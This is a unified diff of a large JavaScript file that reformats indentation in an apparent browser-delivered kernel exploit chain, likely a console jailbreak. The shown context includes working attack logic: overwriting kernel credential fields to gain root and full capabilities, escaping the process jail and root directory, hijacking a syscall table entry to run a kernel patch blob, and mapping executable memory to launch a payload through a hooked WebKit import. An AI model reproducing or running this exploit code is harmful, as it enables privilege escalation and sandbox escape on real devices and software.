@@ -2628,17 +2628,17 @@ let allDone = false,
               mark(
                 "JB-SOURCES",
                 "curproc=" +
-                  curproc +
-                  " ucred=" +
-                  jbUcred +
-                  " krwUcred=" +
-                  UCRED +
-                  " p_fd=" +
-                  pFd +
-                  " prison0=" +
-                  prison0 +
-                  " rootvnode=" +
-                  rootvn,
+                curproc +
+                " ucred=" +
+                jbUcred +
+                " krwUcred=" +
+                UCRED +
+                " p_fd=" +
+                pFd +
+                " prison0=" +
+                prison0 +
+                " rootvnode=" +
+                rootvn,
               );
               const srcOk =
                 kptr(curproc) &&
@@ -2651,13 +2651,13 @@ let allDone = false,
                   "jb-sources-are-kernel-pointers",
                   srcOk,
                   "curproc=" +
-                    curproc +
-                    " ucred=" +
-                    jbUcred +
-                    " pfd=" +
-                    pFd +
-                    " rootvn=" +
-                    rootvn,
+                  curproc +
+                  " ucred=" +
+                  jbUcred +
+                  " pfd=" +
+                  pFd +
+                  " rootvn=" +
+                  rootvn,
                 )
               ) {
                 const uidBefore = sc(SYS.getuid).i32;
@@ -2713,19 +2713,19 @@ let allDone = false,
                 mark(
                   "JB-SAVED",
                   "prison=" +
-                    jbSaved.prison +
-                    " rdir=" +
-                    jbSaved.rdir +
-                    " jdir=" +
-                    jbSaved.jdir +
-                    " uid=" +
-                    jbSaved.uid +
-                    " caps=" +
-                    jbSaved.caps1 +
-                    "/" +
-                    jbSaved.caps0 +
-                    "  (refcounted handles -- restoring these is what keeps" +
-                    " fdescfree/crfree balanced at process exit)",
+                  jbSaved.prison +
+                  " rdir=" +
+                  jbSaved.rdir +
+                  " jdir=" +
+                  jbSaved.jdir +
+                  " uid=" +
+                  jbSaved.uid +
+                  " caps=" +
+                  jbSaved.caps1 +
+                  "/" +
+                  jbSaved.caps0 +
+                  "  (refcounted handles -- restoring these is what keeps" +
+                  " fdescfree/crfree balanced at process exit)",
                 );
 
                 jbRestoreHook = function (why) {
@@ -2748,18 +2748,18 @@ let allDone = false,
                   mark(
                     "JB-RESTORE",
                     why +
-                      " rdir=" +
-                      (okRdir ? 1 : 0) +
-                      " jdir=" +
-                      (okJdir ? 1 : 0) +
-                      " prison=" +
-                      (okPr ? 1 : 0) +
-                      " uid=" +
-                      sc(SYS.getuid).i32 +
-                      " -> " +
-                      (okAll
-                        ? "fdescfree/crfree are balanced again"
-                        : "NOT RESTORED -- reboot before closing the browser"),
+                    " rdir=" +
+                    (okRdir ? 1 : 0) +
+                    " jdir=" +
+                    (okJdir ? 1 : 0) +
+                    " prison=" +
+                    (okPr ? 1 : 0) +
+                    " uid=" +
+                    sc(SYS.getuid).i32 +
+                    " -> " +
+                    (okAll
+                      ? "fdescfree/crfree are balanced again"
+                      : "NOT RESTORED -- reboot before closing the browser"),
                   );
                   check(
                     "JB-RESTORED-CLEAN",
@@ -2774,9 +2774,9 @@ let allDone = false,
                 mark(
                   "JB-UCRED-PROBE",
                   "wrote cr_uid=0x1337 getuid=0x" +
-                    probeUid.toString(16) +
-                    " match=" +
-                    (probeUid === 0x1337 ? 1 : 0),
+                  probeUid.toString(16) +
+                  " match=" +
+                  (probeUid === 0x1337 ? 1 : 0),
                 );
 
                 U.setInt32(CR_UID, 0);
@@ -2792,10 +2792,10 @@ let allDone = false,
                 mark(
                   "JB-CAPS-READBACK",
                   "caps0=" +
-                    read8(jbUcred.add32(0x60)) +
-                    " caps1=" +
-                    read8(jbUcred.add32(0x68)) +
-                    " want=-1/-1",
+                  read8(jbUcred.add32(0x60)) +
+                  " caps1=" +
+                  read8(jbUcred.add32(0x68)) +
+                  " want=-1/-1",
                 );
 
                 const uidNow2 = sc(SYS.getuid).i32;
@@ -2831,21 +2831,21 @@ let allDone = false,
                 mark(
                   "JB-ROOT",
                   "getuid=" +
-                    uidNow2 +
-                    " geteuid=" +
-                    euNow +
-                    " setuid0=" +
-                    suNow +
-                    " cr_uid=" +
-                    rbUid +
-                    " cr_prison=" +
-                    rbPrison +
-                    " fd_rdir=" +
-                    rbRdir +
-                    " sandbox_after=[" +
-                    after.join(" ") +
-                    "] escaped=" +
-                    (escaped ? 1 : 0),
+                  uidNow2 +
+                  " geteuid=" +
+                  euNow +
+                  " setuid0=" +
+                  suNow +
+                  " cr_uid=" +
+                  rbUid +
+                  " cr_prison=" +
+                  rbPrison +
+                  " fd_rdir=" +
+                  rbRdir +
+                  " sandbox_after=[" +
+                  after.join(" ") +
+                  "] escaped=" +
+                  (escaped ? 1 : 0),
                 );
                 check(
                   "JB-ROOT-AND-ESCAPE",
@@ -2861,11 +2861,11 @@ let allDone = false,
               mark(
                 "KPATCH-PRE",
                 "sites=" +
-                  SITES.length +
-                  " jitStub=" +
-                  (jitStub ? 1 : 0) +
-                  " kexecStub=" +
-                  (kexecStub ? 1 : 0),
+                SITES.length +
+                " jitStub=" +
+                (jitStub ? 1 : 0) +
+                " kexecStub=" +
+                (kexecStub ? 1 : 0),
               );
               if (
                 check(
@@ -2881,9 +2881,9 @@ let allDone = false,
                 mark(
                   "JIT-CRED",
                   "caps1=" +
-                    (jbUcred ? read8(jbUcred.add32(0x68)) : "n/a") +
-                    " geteuid=" +
-                    (stGeteuid ? callAddr(stGeteuid, []).i32 : -1),
+                  (jbUcred ? read8(jbUcred.add32(0x68)) : "n/a") +
+                  " geteuid=" +
+                  (stGeteuid ? callAddr(stGeteuid, []).i32 : -1),
                 );
                 const jitFd = callAddr(jitStub, [0, 0x4000, 7]).i32;
                 const jitErr = jitFd < 0 ? errno() : 0;
@@ -2896,15 +2896,15 @@ let allDone = false,
                 mark(
                   "KPATCH-MAP",
                   "jitshm=" +
-                    jitFd +
-                    " jitErr=" +
-                    jitErr +
-                    " mmap=" +
-                    mapAddr +
-                    " mapErr=" +
-                    mapErr +
-                    " fixed=" +
-                    KEXEC_MAP,
+                  jitFd +
+                  " jitErr=" +
+                  jitErr +
+                  " mmap=" +
+                  mapAddr +
+                  " mapErr=" +
+                  mapErr +
+                  " fixed=" +
+                  KEXEC_MAP,
                 );
                 if (
                   check(
@@ -2929,9 +2929,9 @@ let allDone = false,
                   mark(
                     "KPATCH-COPY",
                     "bytes=" +
-                      kpatchBlob.length +
-                      " copied=" +
-                      (copied ? 1 : 0),
+                    kpatchBlob.length +
+                    " copied=" +
+                    (copied ? 1 : 0),
                   );
                   if (check("kpatch-blob-copied", copied, "")) {
                     const sysent = KBASE.add32(off.k_sysent_661);
@@ -2951,32 +2951,32 @@ let allDone = false,
                     mark(
                       "SYSENT-SAVE",
                       "narg=" +
-                        oNarg +
-                        " call=" +
-                        oCall +
-                        " thr=" +
-                        oThr +
-                        " gadget=" +
-                        gadget +
-                        "(ff26=" +
-                        (gadgetOk ? 1 : 0) +
-                        ") sitesOk=" +
-                        (sitesOk ? 1 : 0),
+                      oNarg +
+                      " call=" +
+                      oCall +
+                      " thr=" +
+                      oThr +
+                      " gadget=" +
+                      gadget +
+                      "(ff26=" +
+                      (gadgetOk ? 1 : 0) +
+                      ") sitesOk=" +
+                      (sitesOk ? 1 : 0),
                     );
                     if (
                       check(
                         "kpatch-arm-gates",
                         gadgetOk &&
-                          kptr(oCall) &&
-                          sitesOk &&
-                          oNarg >= 0 &&
-                          oNarg <= 8,
+                        kptr(oCall) &&
+                        sitesOk &&
+                        oNarg >= 0 &&
+                        oNarg <= 8,
                         "gadget=" +
-                          (gadgetOk ? 1 : 0) +
-                          " oCall_kptr=" +
-                          (kptr(oCall) ? 1 : 0) +
-                          " sites=" +
-                          (sitesOk ? 1 : 0),
+                        (gadgetOk ? 1 : 0) +
+                        " oCall_kptr=" +
+                        (kptr(oCall) ? 1 : 0) +
+                        " sites=" +
+                        (sitesOk ? 1 : 0),
                       )
                     ) {
                       let rc = -1;
@@ -3008,21 +3008,21 @@ let allDone = false,
                       mark(
                         "KEXEC",
                         "syscall(661)=" +
-                          rc +
-                          " sites_eb=" +
-                          (allEb ? 1 : 0) +
-                          " sysent_restored=" +
-                          (restored ? 1 : 0),
+                        rc +
+                        " sites_eb=" +
+                        (allEb ? 1 : 0) +
+                        " sysent_restored=" +
+                        (restored ? 1 : 0),
                       );
                       check(
                         "KERNEL-PATCHED",
                         kpDone,
                         "rc=" +
-                          rc +
-                          " allEb=" +
-                          (allEb ? 1 : 0) +
-                          " restored=" +
-                          (restored ? 1 : 0),
+                        rc +
+                        " allEb=" +
+                        (allEb ? 1 : 0) +
+                        " restored=" +
+                        (restored ? 1 : 0),
                       );
                     }
                   }
@@ -3044,11 +3044,11 @@ let allDone = false,
               mark(
                 "PAYLOAD-MAP",
                 "mmap(anon,rwx,0x" +
-                  sz.toString(16) +
-                  ")=" +
-                  entry +
-                  " err=" +
-                  mErr,
+                sz.toString(16) +
+                ")=" +
+                entry +
+                " err=" +
+                mErr,
               );
               if (
                 check(
@@ -3072,8 +3072,8 @@ let allDone = false,
                 mark(
                   "PAYLOAD-COPY",
                   "bytes=" +
-                    payloadBlob.length +
-                    (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)),
+                  payloadBlob.length +
+                  (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)),
                 );
                 const slot = webkitBase.add32(off.wk___imp_pthread_create);
                 const fn = p.read8(slot);
@@ -3117,21 +3117,21 @@ let allDone = false,
               mark(
                 "JB-TDUCRED",
                 "w1.td_ucred=" +
-                  before +
-                  " want=" +
-                  UCRED +
-                  " passB_restore_was_exact=" +
-                  (wasOk ? 1 : 0) +
-                  " repaired=" +
-                  (wasOk ? 0 : 1) +
-                  " now=" +
-                  after,
+                before +
+                " want=" +
+                UCRED +
+                " passB_restore_was_exact=" +
+                (wasOk ? 1 : 0) +
+                " repaired=" +
+                (wasOk ? 0 : 1) +
+                " now=" +
+                after,
               );
               check(
                 "JB-TDUCRED-CLEAN",
                 sameI64(after, UCRED),
                 "w1.td_ucred must equal the real ucred before this thread is" +
-                  " torn down at process exit (crfree runs on it)",
+                " torn down at process exit (crfree runs on it)",
               );
             } catch (e6) {
               mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
@@ -3142,33 +3142,33 @@ let allDone = false,
               mark(
                 "JB-KEEP",
                 "?keepjb=1 -- jailbreak left LIVE. The handles will" +
-                  " be restored on pagehide; if the browser is killed instead," +
-                  " REBOOT rather than closing it.",
+                " be restored on pagehide; if the browser is killed instead," +
+                " REBOOT rather than closing it.",
               );
               window.addEventListener("pagehide", function () {
                 try {
                   jbRestoreHook("pagehide");
-                } catch (e) {}
+                } catch (e) { }
               });
             }
 
             mark(
               "EG-VERDICT",
               "fw=" +
-                fwKey +
-                " kernel_base=" +
-                KBASE +
-                " jailbroken=" +
-                (jbDone ? 1 : 0) +
-                " kpatched=" +
-                (kpDone ? 1 : 0) +
-                " payload_running=" +
-                (plDone ? 1 : 0) +
-                " armings=" +
-                armCount +
-                " jb_restored=" +
-                (jbRestored ? 1 : 0) +
-                "  (.data/.text/caps need a reboot; the refcounted handles do not)",
+              fwKey +
+              " kernel_base=" +
+              KBASE +
+              " jailbroken=" +
+              (jbDone ? 1 : 0) +
+              " kpatched=" +
+              (kpDone ? 1 : 0) +
+              " payload_running=" +
+              (plDone ? 1 : 0) +
+              " armings=" +
+              armCount +
+              " jb_restored=" +
+              (jbRestored ? 1 : 0) +
+              "  (.data/.text/caps need a reboot; the refcounted handles do not)",
             );
             allDone = true;
           }
@@ -3190,18 +3190,18 @@ let allDone = false,
     mark(
       "KF-RAN",
       "oid+0x54=" +
-        (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) +
-        " cands=" +
-        ran.n +
-        " want=0x1",
+      (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) +
+      " cands=" +
+      ran.n +
+      " want=0x1",
     );
     check(
       "KF-UNHIDE-LANDED",
       ran.b === 1 && ran.n === 1,
       "oid+0x54=" +
-        ran.b +
-        " (1 => sysctl_root passed the visibility" +
-        " check, so the .data write at kern.file oid+0x50 landed)",
+      ran.b +
+      " (1 => sysctl_root passed the visibility" +
+      " check, so the .data write at kern.file oid+0x50 landed)",
     );
 
     let xfData = null,
@@ -3228,55 +3228,55 @@ let allDone = false,
       mark(
         "KF-SCAN",
         "entries=" +
-          n +
-          " seen=" +
-          kfSeen +
-          " pid=" +
-          pid +
-          " fd=" +
-          kfSock +
-          " xf_file=" +
-          xfFile +
-          " xf_data=" +
-          xfData,
+        n +
+        " seen=" +
+        kfSeen +
+        " pid=" +
+        pid +
+        " fd=" +
+        kfSock +
+        " xf_file=" +
+        xfFile +
+        " xf_data=" +
+        xfData,
       );
       check("KF-SOCKET-NAMED", !!xfData, "xf_data=" + xfData);
     } else {
       mark(
         "KF-SCAN",
         "skipped rv=" +
-          after.rv +
-          " errno=" +
-          after.err +
-          " reason=caps_gate_still_closed_as_predicted",
+        after.rv +
+        " errno=" +
+        after.err +
+        " reason=caps_gate_still_closed_as_predicted",
       );
     }
 
     mark(
       "KF-VERDICT",
       "fw=" +
-        fwKey +
-        " kernel_base=" +
-        KBASE +
-        " anchor_confirmed=" +
-        (on.v === KERN_FILE_NUM ? 1 : 0) +
-        " unhide_landed=" +
-        (ran.b === 1 ? 1 : 0) +
-        " sysctl_rv=" +
-        after.rv +
-        " errno=" +
-        after.err +
-        " xf_data=" +
-        (xfData ? xfData : "none") +
-        " armings=" +
-        armCount +
-        " next=set_cr_sceCaps_bit62_ucred+0x64_bit30",
+      fwKey +
+      " kernel_base=" +
+      KBASE +
+      " anchor_confirmed=" +
+      (on.v === KERN_FILE_NUM ? 1 : 0) +
+      " unhide_landed=" +
+      (ran.b === 1 ? 1 : 0) +
+      " sysctl_rv=" +
+      after.rv +
+      " errno=" +
+      after.err +
+      " xf_data=" +
+      (xfData ? xfData : "none") +
+      " armings=" +
+      armCount +
+      " next=set_cr_sceCaps_bit62_ucred+0x64_bit30",
     );
     mark(
       "KF-DATA-LEFT-DIRTY",
       "oid+0x50 left nonzero and oid+0x51..0x54" +
-        " perturbed by the sweep -- .data is reloaded from the boot image," +
-        " so REBOOT clears it. No restore attempted on purpose.",
+      " perturbed by the sweep -- .data is reloaded from the boot image," +
+      " so REBOOT clears it. No restore attempted on purpose.",
     );
 
     {
@@ -3287,13 +3287,13 @@ let allDone = false,
       mark(
         "CAPS-COLLATERAL",
         "caps67_nodes=" +
-          nodes +
-          " caps1_lo24_delta=-" +
-          (nodes >> 8) +
-          " exact=" +
-          ((nodes & 0xff) === 0 ? 1 : 0) +
-          " bits24_63=untouched kind=bitmask_not_pointer" +
-          " reboot=restores",
+        nodes +
+        " caps1_lo24_delta=-" +
+        (nodes >> 8) +
+        " exact=" +
+        ((nodes & 0xff) === 0 ? 1 : 0) +
+        " bits24_63=untouched kind=bitmask_not_pointer" +
+        " reboot=restores",
       );
     }
     allDone = true;
@@ -3309,13 +3309,13 @@ let allDone = false,
     mark(
       "PR-NEUTRALISE",
       "next=0 on " +
-        renew +
-        "/" +
-        POOL.length +
-        "  armings_left_dangling=" +
-        armCount +
-        "  (workers deliberately NOT terminated: their td_proc is corrupt" +
-        " and terminate() would make them syscall)",
+      renew +
+      "/" +
+      POOL.length +
+      "  armings_left_dangling=" +
+      armCount +
+      "  (workers deliberately NOT terminated: their td_proc is corrupt" +
+      " and terminate() would make them syscall)",
     );
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
@@ -3352,17 +3352,17 @@ let allDone = false,
 
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
-    } catch (e) {}
+    } catch (e) { }
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
-        passCount +
-        " fail=" +
-        failCount +
-        (allDone ? "" : "  INCOMPLETE"),
+      passCount +
+      " fail=" +
+      failCount +
+      (allDone ? "" : "  INCOMPLETE"),
     );
     try {
       finishUI(payloadRunning);
-    } catch (eUI) {}
+    } catch (eUI) { }
   }
 })();
